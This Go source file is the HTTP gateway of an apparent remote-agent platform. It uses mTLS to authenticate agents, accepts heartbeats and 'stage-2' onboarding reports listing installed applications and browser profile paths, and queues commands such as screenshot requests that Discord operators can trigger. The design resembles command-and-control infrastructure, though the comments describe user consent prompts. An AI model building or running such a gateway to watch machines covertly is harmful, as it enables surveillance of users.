package transport

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"google.golang.org/protobuf/types/known/timestamppb"

	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/broker"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/command"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/identity"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/provider"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/sdk"
	pb "github.com/codevault-llc/xenomorph/platform/shared/proto/gen/go/platform/v1"
)

// Server owns the HTTP transport layer for the gateway. It handles mTLS
// termination, agent identity extraction, request routing, and event
// publishing to the NATS broker.
type Server struct {
	broker         *broker.NATS
	notifier       *provider.Fanout
	commandQueue   *command.Queue
	discordPoster  provider.DiscordPoster
	statusProvider agentStatusProvider
	engine         *gin.Engine

	seenMu     sync.Mutex
	seenAgents map[string]struct{}
}

// agentStatusProvider is the interface the Server requires for agent presence
// queries. The activity.Monitor implements this interface.
type agentStatusProvider interface {
	Snapshot(agentID string) (provider.AgentSnapshot, bool)
}

// NewServer constructs a Server with the given dependencies. All parameters
// are required except notifier (defaults to no-op Fanout) and discordPoster
// (nil is valid when Discord is not configured).
func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.Queue, discordPoster provider.DiscordPoster, statusProvider agentStatusProvider) *Server {
	if notifier == nil {
		notifier = provider.NewFanout(nil)
	}

	s := &Server{
		broker:         b,
		notifier:       notifier,
		commandQueue:   commandQueue,
		discordPoster:  discordPoster,
		statusProvider: statusProvider,
		engine:         gin.Default(),
		seenAgents:     make(map[string]struct{}),
	}
	s.routes()
	return s
}

// routes registers all HTTP middleware and endpoints on the Gin engine.
//
// Middleware execution order:
//  1. traceMiddleware — injects trace_id from X-Trace-ID header or generates one.
//  2. mtlsMiddleware — authenticates the client via mTLS peer certificate.
//
// Endpoints:
//
//	POST /ingest/heartbeat   — accepts agent heartbeat payloads.
//	POST /ingest/entry       — accepts stage-2 onboarding reports.
//	GET  /commands/next      — dequeues the next pending command for an agent.
//	POST /commands/result    — accepts command execution results.
func (s *Server) routes() {
	s.engine.Use(s.traceMiddleware)
	s.engine.Use(s.mtlsMiddleware)

	s.engine.POST("/ingest/heartbeat", s.handleHeartbeat)
	s.engine.POST("/ingest/entry", s.handleEntry)
	s.engine.GET("/commands/next", s.handleNextCommand)
	s.engine.POST("/commands/result", s.handleCommandResult)
}

// traceMiddleware extracts the X-Trace-ID header from the incoming request
// and stores it in both the Gin context and the request context. When the
// header is absent, a new UUID is generated.
//
// The trace ID is set on the response header and automatically injected into
// all log records produced by the slog context handler.
func (s *Server) traceMiddleware(c *gin.Context) {
	traceID := c.GetHeader("X-Trace-ID")
	if traceID == "" {
		traceID = uuid.New().String()
	}
	c.Set("trace_id", traceID)
	c.Header("X-Trace-ID", traceID)
	c.Request = c.Request.WithContext(sdk.WithTraceID(c.Request.Context(), traceID))
	c.Next()
}

// mtlsMiddleware authenticates every request using the mTLS peer certificate.
// The agent identity is derived deterministically from the certificate
// fingerprint and stored in the Gin context for downstream handlers.
//
// The middleware aborts with HTTP 403 when:
//   - The TLS connection has no peer certificates (plain HTTP or no client cert).
//   - The peer certificate cannot be parsed into a valid agent identity.
//
// Downstream handlers access the authenticated identity through Gin context
// keys: "agent_id", "agent_cert_fingerprint_sha256", "agent_subject_cn".
func (s *Server) mtlsMiddleware(c *gin.Context) {
	if c.Request.TLS != nil && len(c.Request.TLS.PeerCertificates) > 0 {
		cert := c.Request.TLS.PeerCertificates[0]
		authenticatedAgent, err := identity.FromPeerCertificate(cert)
		if err != nil {
			slog.ErrorContext(c.Request.Context(), "invalid client certificate identity",
				"error", err,
			)
			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "invalid client certificate identity"})
			return
		}

		c.Set("agent_id", authenticatedAgent.ID)
		c.Set("agent_cert_fingerprint_sha256", authenticatedAgent.FingerprintSHA256)
		c.Set("agent_subject_cn", authenticatedAgent.SubjectCommonName)
	} else {
		c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "mTLS required"})
		return
	}
	c.Next()
}

// handleHeartbeat processes an authenticated heartbeat submission.
//
// The agent identity is extracted from the mTLS peer certificate (set by
// mtlsMiddleware). No client-supplied identity fields in the request body
// are trusted. The heartbeat is wrapped in a server-authored EventEnvelope
// with the authenticated agent ID and published to NATS on subject
// "sys.in.default.<agentID>.heartbeat".
//
// Expected request body: proto.Heartbeat JSON representation.
// Response: 202 Accepted with event_id and is_new_agent flags.
func (s *Server) handleHeartbeat(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var hb pb.Heartbeat
	if err := c.ShouldBindJSON(&hb); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.Now(),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_Heartbeat{Heartbeat: &hb},
	}

	subject := "sys.in.default." + agentID + ".heartbeat"
	if err := s.broker.Publish(subject, env); err != nil {
		slog.ErrorContext(c.Request.Context(), "heartbeat publish failed",
			"agent_id", agentID,
			"error", err,
		)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	_, existed := s.markSeen(agentID)

	c.JSON(http.StatusAccepted, gin.H{
		"status":       "accepted",
		"event_id":     env.EventId,
		"is_new_agent": !existed,
	})
}

// entryBrowser is the JSON shape for a browser entry in the onboarding report.
type entryBrowser struct {
	Name       string `json:"name"`
	BinaryPath string `json:"binary_path"`
	ProfileDir string `json:"profile_dir"`
}

// entryRequest is the JSON shape for the stage-2 onboarding submission.
type entryRequest struct {
	Hostname              string         `json:"hostname" binding:"required"`
	OSVersion             string         `json:"os_version"`
	IsNewAgent            bool           `json:"is_new_agent"`
	Browsers              []entryBrowser `json:"browsers"`
	InstalledApplications []string       `json:"installed_applications"`
}

// handleEntry processes an authenticated stage-2 onboarding report.
//
// The agent identity is extracted from the mTLS session. The request body
// is validated and normalized through normalizeEntryRequest, which applies
// length limits to every text field. The normalized report is published to
// NATS and forwarded to notification providers that implement EntryReporter.
//
// Expected request body: entryRequest JSON.
// Response: 202 Accepted with event_id.
func (s *Server) handleEntry(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var req entryRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	report := normalizeEntryRequest(agentID, req)

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.New(report.OccurredAt),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_LogEntry{LogEntry: &pb.LogEntry{
			Level:     "INFO",
			Component: "gateway.ingest.entry",
			Message: fmt.Sprintf(
				"stage2 entry accepted hostname=%s browsers=%d apps=%d is_new_agent=%t",
				report.Hostname,
				len(report.Browsers),
				len(report.InstalledApplications),
				report.IsNewAgent,
			),
		}},
	}

	subject := "sys.in.default." + agentID + ".entry"
	if err := s.broker.Publish(subject, env); err != nil {
		slog.ErrorContext(c.Request.Context(), "entry publish failed",
			"agent_id", agentID,
			"error", err,
		)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	if err := s.notifier.ReportEntry(c.Request.Context(), report); err != nil {
		slog.ErrorContext(c.Request.Context(), "entry notification delivery failed",
			"agent_id", agentID,
			"error", err,
		)
	}

	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
}

// handleNextCommand dequeues the next pending command for the authenticated
// agent. Returns 204 No Content when the queue is empty.
func (s *Server) handleNextCommand(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	if s.commandQueue == nil {
		c.Status(http.StatusNoContent)
		return
	}

	cmd := s.commandQueue.Dequeue(agentID)
	if cmd == nil {
		c.Status(http.StatusNoContent)
		return
	}

	c.JSON(http.StatusOK, cmd)
}

// commandResultRequest is the JSON shape for a command execution result.
type commandResultRequest struct {
	CommandID      string `json:"command_id" binding:"required"`
	Type           string `json:"type" binding:"required"`
	Status         string `json:"status" binding:"required"`
	Reason         string `json:"reason"`
	UserApproved   bool   `json:"user_approved"`
	DisconnectNow  bool   `json:"disconnect_now"`
	ClientHostname string `json:"client_hostname"`
	OutputData     []byte `json:"output_data,omitempty"`
}

// handleCommandResult processes an authenticated command execution result.
//
// The result is published as an audit log entry to NATS. When the result
// includes screenshot output data and a Discord poster is configured, the
// screenshot is forwarded to the agent's Discord commands channel.
func (s *Server) handleCommandResult(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var req commandResultRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	message := fmt.Sprintf(
		"command_result command_id=%s type=%s status=%s approved=%t disconnect_now=%t hostname=%s reason=%s output_bytes=%d",
		clampText(req.CommandID, 128),
		clampText(req.Type, 64),
		clampText(req.Status, 32),
		req.UserApproved,
		req.DisconnectNow,
		clampText(req.ClientHostname, 120),
		clampText(req.Reason, 512),
		len(req.OutputData),
	)

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.Now(),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_LogEntry{LogEntry: &pb.LogEntry{
			Level:     "INFO",
			Component: "gateway.command.audit",
			Message:   message,
		}},
	}

	subject := "sys.in.default." + agentID + ".command.audit"
	if err := s.broker.Publish(subject, env); err != nil {
		slog.ErrorContext(c.Request.Context(), "command result publish failed",
			"agent_id", agentID,
			"command_id", req.CommandID,
			"error", err,
		)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	if len(req.OutputData) > 0 && s.discordPoster != nil {
		s.forwardScreenshotToDiscord(c.Request.Context(), agentID, req)
	}

	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
}

// forwardScreenshotToDiscord sends a command result screenshot to the agent's
// Discord commands channel. The function is a no-op when the agent has no
// mapped Discord commands channel or when the Discord poster is nil.
//
// Security: screenshot output data originates from a remote agent and is
// forwarded as-is. The data is treated as opaque bytes and no content
// inspection is performed before forwarding to Discord.
func (s *Server) forwardScreenshotToDiscord(ctx context.Context, agentID string, req commandResultRequest) {
	channelID, ok := s.discordPoster.CommandsChannelID(agentID)
	if !ok {
		slog.WarnContext(ctx, "no Discord commands channel found for agent; screenshot not forwarded",
			"agent_id", agentID,
		)
		return
	}

	if req.Status != "executed" {
		s.discordPoster.SendChannelMessage(ctx, channelID,
			fmt.Sprintf("Screenshot request **%s** was **%s**: %s", req.CommandID, req.Status, req.Reason))
		return
	}

	if len(req.OutputData) == 0 {
		s.discordPoster.SendChannelMessage(ctx, channelID, "Screenshot returned empty data")
		return
	}

	fileName := fmt.Sprintf("screenshot_%s.png", time.Now().UTC().Format("20060102_150405"))
	caption := fmt.Sprintf("Screenshot captured from **%s** (command: `%s`)", req.ClientHostname, req.CommandID)
	if err := s.discordPoster.SendChannelFile(ctx, channelID, fileName, req.OutputData, caption); err != nil {
		slog.ErrorContext(ctx, "failed to post screenshot to Discord",
			"agent_id", agentID,
			"command_id", req.CommandID,
			"error", err,
		)
	}
}

// helpText is the response sent for the !help and !h Discord commands.
var helpText = "**Available Commands**\n\n" +
	"`!help` / `!h`\n" +
	"Show this help message\n\n" +
	"`!status`\n" +
	"Show agent connection status (online, hostname, last seen)\n\n" +
	"`!screenshot` / `!ss`\n" +
	"Request a screenshot from the agent"

// HandleDiscordCommand routes a parsed Discord !-command to the appropriate
// handler based on the command name. Unknown commands return a help hint.
func (s *Server) HandleDiscordCommand(ctx context.Context, agentID, channelID, command string, args []string, userName string) error {
	if s.discordPoster == nil {
		return nil
	}

	switch command {
	case "help", "h":
		return s.discordPoster.SendChannelMessage(ctx, channelID, helpText)
	case "status":
		return s.handleDiscordStatus(ctx, agentID, channelID)
	case "screenshot", "ss":
		return s.handleDiscordScreenshot(ctx, agentID, channelID, userName)
	default:
		return s.discordPoster.SendChannelMessage(ctx, channelID,
			fmt.Sprintf("Unknown command `!%s`. Try `!help`.", command))
	}
}

// handleDiscordStatus responds with the agent's current online/offline status.
// The snapshot is sourced from the activity.Monitor via the statusProvider
// interface. Returns a human-readable message suitable for Discord.
func (s *Server) handleDiscordStatus(ctx context.Context, agentID, channelID string) error {
	if s.statusProvider == nil {
		return s.discordPoster.SendChannelMessage(ctx, channelID, "Status provider not available")
	}

	snapshot, ok := s.statusProvider.Snapshot(agentID)
	if !ok {
		return s.discordPoster.SendChannelMessage(ctx, channelID,
			fmt.Sprintf("Agent `%s` has never connected or has been offline for too long.", agentID))
	}

	ts := snapshot.LastSeen.UTC().Format("Mon Jan 02 2006 15:04:05 UTC")
	statusIndicator := "Online"
	if !snapshot.IsOnline {
		statusIndicator = "Offline"
	}

	msg := fmt.Sprintf(
		"**Agent Status**\n**%s**\n**Hostname:** %s\n**Agent ID:** `%s`\n**Last Seen:** %s",
		statusIndicator, snapshot.Hostname, agentID, ts,
	)
	return s.discordPoster.SendChannelMessage(ctx, channelID, msg)
}

// handleDiscordScreenshot enqueues a screenshot request for the agent.
// The agent receives the command on its next poll cycle and prompts the user
// for consent before executing.
func (s *Server) handleDiscordScreenshot(ctx context.Context, agentID, channelID, userName string) error {
	if s.commandQueue == nil {
		return s.discordPoster.SendChannelMessage(ctx, channelID, "Command queue not available")
	}

	s.commandQueue.Enqueue(agentID, &command.Envelope{
		Type:        "support.request_screenshot",
		RequestedBy: userName,
		Reason:      fmt.Sprintf("Screenshot requested by %s via Discord", userName),
	})

	return s.discordPoster.SendChannelMessage(ctx, channelID,
		fmt.Sprintf("Screenshot request queued for agent `%s`. The agent will be prompted for consent on the next poll cycle.", agentID))
}

// markSeen records that an agent has been observed. Returns whether this is
// the first observation (inserted) and whether the agent was previously known
// (existed). Thread-safe.
func (s *Server) markSeen(agentID string) (inserted bool, existed bool) {
	s.seenMu.Lock()
	defer s.seenMu.Unlock()

	_, existed = s.seenAgents[agentID]
	if !existed {
		s.seenAgents[agentID] = struct{}{}
		return true, false
	}

	return false, true
}

// normalizeEntryRequest validates and constrains an entry request into a
// provider.EntryReport. Every client-supplied text field is clamped to a
// maximum length before entering the event pipeline.
//
// Length limits and why:
//   - Hostname: 120 characters (typical FQDN limit per RFC 1035).
//   - OSVersion: 120 characters (free-form, but bounded to prevent abuse).
//   - Browser name: 80 characters.
//   - BinaryPath: 260 characters (Windows MAX_PATH convention).
//   - ProfileDir: 260 characters (same convention).
//   - Application name: 120 characters.
//   - Maximum browsers: 32 (reasonable upper bound for browser enumeration).
//   - Maximum applications: 200 (prevents unbounded memory growth).
func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryReport {
	const (
		maxApps     = 200
		maxBrowsers = 32
	)

	browsers := make([]provider.BrowserInfo, 0, len(req.Browsers))
	for _, b := range req.Browsers {
		if len(browsers) >= maxBrowsers {
			break
		}

		name := clampText(b.Name, 80)
		if name == "" {
			continue
		}

		browsers = append(browsers, provider.BrowserInfo{
			Name:       name,
			BinaryPath: clampText(b.BinaryPath, 260),
			ProfileDir: clampText(b.ProfileDir, 260),
		})
	}

	apps := make([]string, 0, len(req.InstalledApplications))
	for _, app := range req.InstalledApplications {
		if len(apps) >= maxApps {
			break
		}

		item := clampText(app, 120)
		if item == "" {
			continue
		}
		apps = append(apps, item)
	}

	return provider.EntryReport{
		AgentID:               agentID,
		Hostname:              clampText(req.Hostname, 120),
		OSVersion:             clampText(req.OSVersion, 120),
		IsNewAgent:            req.IsNewAgent,
		Browsers:              browsers,
		InstalledApplications: apps,
		OccurredAt:            timestamppb.Now().AsTime(),
		Source:                "entry",
	}
}

// clampText truncates the input to the specified byte length after trimming
// whitespace. Returns an empty string when the trimmed input is empty.
//
// This is the final length gate for client-supplied strings entering the
// event pipeline. Every handler that stores or forwards user-authored text
// must pass the text through clampText with a limit appropriate for the
// downstream consumer.
func clampText(value string, limit int) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}
	if len(trimmed) <= limit {
		return trimmed
	}
	return trimmed[:limit]
}

// Run starts the HTTPS listener with strict mTLS enforcement. The server
// loads the CA certificate, server certificate, and server key from certPath.
//
// TLS configuration:
//   - ClientAuth: RequireAndVerifyClientCert (strict mTLS).
//   - MinVersion: TLS 1.3 (no fallback to older versions).
//   - ClientCAs: CA pool built from certPath/ca.crt.
//
// Certificate files expected in certPath:
//   - ca.crt — CA certificate for client verification.
//   - server.crt — server certificate for TLS handshake.
//   - server.key — server private key.
func (s *Server) Run(addr, certPath string) error {
	caCert, err := os.ReadFile(certPath + "/ca.crt")
	if err != nil {
		return fmt.Errorf("read CA certificate: %w", err)
	}

	caCertPool := x509.NewCertPool()
	if ok := caCertPool.AppendCertsFromPEM(caCert); !ok {
		return fmt.Errorf("parse CA certificate: invalid PEM data")
	}

	tlsConfig := &tls.Config{
		ClientCAs:  caCertPool,
		ClientAuth: tls.RequireAndVerifyClientCert,
		MinVersion: tls.VersionTLS13,
	}

	server := &http.Server{
		Addr:      addr,
		Handler:   s.engine,
		TLSConfig: tlsConfig,
	}
	return server.ListenAndServeTLS(certPath+"/server.crt", certPath+"/server.key")
}
